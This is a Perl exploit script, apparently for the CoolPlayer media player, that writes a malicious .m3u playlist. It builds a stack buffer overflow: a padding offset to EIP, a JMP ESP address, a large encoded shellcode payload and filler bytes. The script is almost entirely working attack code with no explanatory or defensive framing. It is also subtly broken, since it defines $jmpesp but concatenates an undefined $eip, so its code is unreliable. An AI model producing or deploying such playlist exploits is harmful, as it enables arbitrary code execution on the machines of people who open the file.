#!/usr/bin/perl

my $buffsize = 10000; #set consistent buffer size
my $junk = "\x41" x 219; #offset to EIP
my $jmpesp = "\xd8\x9e\x24\x77";
my $shellcode = "\xb8\x24\xa1\x25\xa4\xd9\xc7\xd9\x74\x24\xf4\x5f\x29\xc9" .
"\xb1\x53\x31\x47\x12\x83\xef\xfc\x03\x63\xaf\xc7\x51\x97" .
"\x47\x85\x9a\x67\x98\xea\x13\x82\xa9\x2a\x47\xc7\x9a\x9a" .
"\x03\x85\x16\x50\x41\x3d\xac\x14\x4e\x32\x05\x92\xa8\x7d" .
"\x96\x8f\x89\x1c\x14\xd2\xdd\xfe\x25\x1d\x10\xff\x62\x40" .
"\xd9\xad\x3b\x0e\x4c\x41\x4f\x5a\x4d\xea\x03\x4a\xd5\x0f" .
"\xd3\x6d\xf4\x9e\x6f\x34\xd6\x21\xa3\x4c\x5f\x39\xa0\x69" .
"\x29\xb2\x12\x05\xa8\x12\x6b\xe6\x07\x5b\x43\x15\x59\x9c" .
"\x64\xc6\x2c\xd4\x96\x7b\x37\x23\xe4\xa7\xb2\xb7\x4e\x23" .
"\x64\x13\x6e\xe0\xf3\xd0\x7c\x4d\x77\xbe\x60\x50\x54\xb5" .
"\x9d\xd9\x5b\x19\x14\x99\x7f\xbd\x7c\x79\xe1\xe4\xd8\x2c" .
"\x1e\xf6\x82\x91\xba\x7d\x2e\xc5\xb6\xdc\x27\x2a\xfb\xde" .
"\xb7\x24\x8c\xad\x85\xeb\x26\x39\xa6\x64\xe1\xbe\xc9\x5e" .
"\x55\x50\x34\x61\xa6\x79\xf3\x35\xf6\x11\xd2\x35\x9d\xe1" .
"\xdb\xe3\x08\xe9\x7a\x5c\x2f\x14\x3c\x0c\xef\xb6\xd5\x46" .
"\xe0\xe9\xc6\x68\x2a\x82\x6f\x95\xd5\xbd\x33\x10\x33\xd7" .
"\xdb\x74\xeb\x4f\x1e\xa3\x24\xe8\x61\x81\x1c\x9e\x2a\xc3" .
"\x9b\xa1\xaa\xc1\x8b\x35\x21\x06\x08\x24\x36\x03\x38\x31" .
"\xa1\xd9\xa9\x70\x53\xdd\xe3\xe2\xf0\x4c\x68\xf2\x7f\x6d" .
"\x27\xa5\x28\x43\x3e\x23\xc5\xfa\xe8\x51\x14\x9a\xd3\xd1" .
"\xc3\x5f\xdd\xd8\x86\xe4\xf9\xca\x5e\xe4\x45\xbe\x0e\xb3" .
"\x13\x68\xe9\x6d\xd2\xc2\xa3\xc2\xbc\x82\x32\x29\x7f\xd4" .
"\x3a\x64\x09\x38\x8a\xd1\x4c\x47\x23\xb6\x58\x30\x59\x26" .
"\xa6\xeb\xd9\x56\xed\xb1\x48\xff\xa8\x20\xc9\x62\x4b\x9f" .
"\x0e\x9b\xc8\x15\xef\x58\xd0\x5c\xea\x25\x56\x8d\x86\x36" .
"\x33\xb1\x35\x36\x16";

my $sploit = $junk.$eip.$shellcode; #build sploit portion of buffer
my $fill = "\x43" x ($buffsize - (length($sploit))); # fill remainder of buffer for size consistency
my $buffer = $sploit.$fill; # build final buffer

# write the exploit buffer to file

my $file = "coolplayershellcode_att.m3u";
open(FILE, ">$file");
print FILE $buffer;
close(FILE);
print "Exploit file created [" . $file . "]\n";
print "Buffer size: " . length($buffer). "\n";
